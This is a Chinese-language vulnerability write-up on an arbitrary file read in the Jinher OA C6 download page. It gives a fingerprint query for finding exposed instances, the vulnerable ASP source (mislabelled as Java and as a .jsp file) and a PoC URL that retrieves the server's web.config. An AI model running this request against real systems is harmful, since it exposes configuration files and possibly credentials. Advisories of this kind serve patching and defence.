# 金和OA C6 download.jsp 任意文件读取漏洞

## 漏洞描述

金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息

## 漏洞影响

```
金和OA
```

## 网络测绘

```
app="Jinher-OA"
```

## 漏洞复现

登录页面如下

![](images/202202090141493.png)



漏洞文件为 download.asp

```java
<%       
	Response.Buffer     =     true       
	Response.Clear       
	      
	dim     url       
	Dim     fso,fl,flsize       
	dim     Dname       
	Dim     objStream,ContentType,flName,isre,url1       
	'*********************************************调用时传入的下载文件名       
	Dname=trim(request("filename"))       
	'******************************************************************       
	If     Dname<>""     Then       
	'******************************下载文件存放的服务端目录       
							url=server.MapPath(Dname)       
							'url=server.MapPath("./")&"\Jhsoft.Web.module\testbill\dj"&Dname     '这边做了一下改动By   Fanshui   
	'***************************************************       
	End     If       
	'Response.write   url   
	'response.end   

	Set     fso=Server.CreateObject("Scripting.FileSystemObject")       
	Set     fl=fso.getfile(url)       
	flsize=fl.size       
	flName=fl.name       
	Set     fl=Nothing       
	Set     fso=Nothing     
	'Response.write flName
	'Response.write flsize
%>    


<%       
    Set		objStream     =     Server.CreateObject("ADODB.Stream")
	'objStream.Mode 　  = 　  3 　
	objStream.Type     =     1
    objStream.Open        
    objStream.LoadFromFile     url       


    Select     Case     lcase(Right(flName,     4))       
        Case     ".asf"       
                                ContentType     =     "video/x-ms-asf"       
        Case     ".avi"       
                                ContentType     =     "video/avi"       
        Case     ".doc"       
                                ContentType     =     "application/msword"       
        Case     ".zip"       
                                ContentType     =     "application/zip"       
        Case     ".xls"       
                                ContentType     =     "application/vnd.ms-excel"       
        Case     ".gif"       
                                ContentType     =     "image/gif"       
        Case     ".jpg",     "jpeg"       
                                ContentType     =     "image/jpeg"       
        Case     ".wav"       
                                ContentType     =     "audio/wav"       
        Case     ".mp3"       
                                ContentType     =     "audio/mpeg3"       
        Case     ".mpg",     "mpeg"       
                                ContentType     =     "video/mpeg"       
        Case     ".rtf"       
                                ContentType     =     "application/rtf"       
        Case     ".htm",     "html"       
                                ContentType     =     "text/html"       
        Case     ".txt"       
                                ContentType     =     "text/plain"       
        Case     Else       
                                ContentType     =     "application/octet-stream"       
    End     Select       



	Response.AddHeader     "Content-Disposition",     "attachment;     filename="     &     flName       
    Response.AddHeader     "Content-Length",     flsize       

    Response.Charset     =     "UTF-8"       
    Response.ContentType     =     ContentType   

	Response.BinaryWrite     objStream.Read       
    Response.Flush       
    response.Clear()       
    objStream.Close       
    Set     objStream     =     Nothing       

%>
```

请求的POC为

```plain
/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
```

![](images/202202090141014.png)

读取 web.config

```plain
/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
```

![](images/202202090141775.png)